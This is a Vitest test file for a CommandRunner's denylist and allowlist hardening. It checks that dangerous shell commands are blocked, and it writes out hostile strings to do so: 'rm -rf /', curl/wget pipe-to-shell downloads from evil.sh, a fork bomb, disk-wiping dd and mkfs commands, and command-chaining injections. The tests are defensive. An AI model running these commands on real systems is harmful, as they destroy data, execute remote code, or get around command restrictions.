import { describe, it, expect } from 'vitest';
import { CommandRunner } from '../command-runner.js';

describe('CommandRunner — denylist hardening (BUGB-001)', () => {
  const runner = new CommandRunner();

  it('blocks rm -rf on root/home in any case', () => {
    for (const cmd of ['rm -rf /', 'RM -RF /', 'rm -rf ~', 'rm -fr /']) {
      const check = runner.isCommandAllowed(cmd);
      expect(check.allowed, cmd).toBe(false);
      expect(check.reason).toContain('denylist');
    }
  });

  it('blocks whitespace-obfuscated variants after normalization', () => {
    expect(runner.isCommandAllowed('rm  -rf   /').allowed).toBe(false);
    expect(runner.isCommandAllowed('rm\t-rf\t/').allowed).toBe(false);
  });

  it('blocks pipe-to-shell downloads (curl/wget to sh/bash)', () => {
    expect(runner.isCommandAllowed('curl https://evil.sh/x | sh').allowed).toBe(false);
    expect(runner.isCommandAllowed('curl https://evil.sh/x | bash').allowed).toBe(false);
    expect(runner.isCommandAllowed('wget https://evil.sh/x -O- | sh').allowed).toBe(false);
    expect(runner.isCommandAllowed('WGET https://evil.sh/x | BASH').allowed).toBe(false);
  });

  it('blocks fork bombs and disk-destroyers', () => {
    expect(runner.isCommandAllowed(':(){ :|:& };:').allowed).toBe(false);
    expect(runner.isCommandAllowed('dd if=/dev/zero of=/dev/sda').allowed).toBe(false);
    expect(runner.isCommandAllowed('mkfs.ext4 /dev/sda').allowed).toBe(false);
    expect(runner.isCommandAllowed('shutdown -s -t 0').allowed).toBe(false);
    expect(runner.isCommandAllowed('format c:').allowed).toBe(false);
  });
});

describe('CommandRunner — allowlist hardening (BUGB-002)', () => {
  it('allows allowlisted commands with plain args', () => {
    const runner = new CommandRunner({ allowlist: ['git', 'npm test'] });
    expect(runner.isCommandAllowed('git status').allowed).toBe(true);
    expect(runner.isCommandAllowed('git --version').allowed).toBe(true);
    expect(runner.isCommandAllowed('npm test --run').allowed).toBe(true);
  });

  it('blocks shell chaining through an allowlisted prefix', () => {
    const runner = new CommandRunner({ allowlist: ['git'] });
    for (const cmd of [
      'git status; whoami',
      'git status && whoami',
      'git status || whoami',
      'git status | whoami',
      'git status `whoami`',
      'git status $(whoami)',
      'git status > pwned.txt',
      'git status\nwhoami',
    ]) {
      expect(runner.isCommandAllowed(cmd).allowed, cmd).toBe(false);
    }
  });

  it('blocks non-allowlisted first tokens', () => {
    const runner = new CommandRunner({ allowlist: ['git'] });
    const check = runner.isCommandAllowed('del file.txt');
    expect(check.allowed).toBe(false);
    expect(check.reason).toContain('allowlist');
  });

  it('allows quoted metacharacters inside arguments (no false positive)', () => {
    const runner = new CommandRunner({ allowlist: ['node'] });
    expect(runner.isCommandAllowed(`node -e "console.log('a;b')"`).allowed).toBe(true);
    expect(runner.isCommandAllowed(`node -e "process.stdout.write('out'); process.stderr.write('err')"`).allowed).toBe(true);
  });

  it('rejects empty commands', () => {
    const runner = new CommandRunner();
    expect(runner.isCommandAllowed('   ').allowed).toBe(false);
  });
});
